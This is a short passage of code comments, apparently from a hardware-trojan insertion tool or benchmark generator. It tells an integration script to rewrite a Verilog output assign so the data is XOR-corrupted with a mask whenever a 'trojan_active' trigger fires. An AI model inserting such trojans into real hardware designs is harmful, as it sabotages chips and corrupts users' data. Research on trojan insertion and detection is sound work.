...
//
// IMPORTANT: data_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If data_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for data_i (or first output assign):
//     assign data_i = <expr>;
//   Replace with:
//     assign data_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
